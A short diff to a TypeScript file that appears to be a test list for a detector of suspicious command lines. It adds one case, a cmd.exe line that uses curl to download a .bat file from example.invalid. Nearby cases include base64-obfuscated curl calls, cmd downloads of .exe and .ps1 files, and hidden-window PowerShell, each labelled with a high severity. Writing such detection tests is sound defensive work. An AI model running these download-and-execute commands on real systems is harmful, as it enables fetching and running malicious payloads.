@@ -242,6 +242,7 @@ const PORTED: readonly [string, 'high' | 'medium', string][] = [
   ['herestring-base64', 'high', x('curl -kf', 'sSL $(echo aGVsbG8gd29ybGQK | base', '64 -d)')],
   ['cmd-payload', 'high', x(CMD, ' /c curl -o t.exe https://example.invalid/t.exe')],
   ['cmd-payload', 'high', x(CMD, ' /c cu', 'rl.exe -o t.ps1 https://example.invalid/t.ps1')],
+  ['cmd-payload', 'high', x(CMD, '.exe /c cu', 'rl.exe -o t.bat https://example.invalid/t.bat')],
   ['cmd-for-delims', 'high', x(CMD, ' /c "for /f "tokens=1 delims=," %a in ("pow,er") do echo %a"')],
   ['powershell-hidden', 'high', x(PSH, ' -w minimized -c "Write-Output test"')],
   ['powershell-hidden', 'high', x(PSH, ' -WindowStyle h -c "Write-Output test"')],
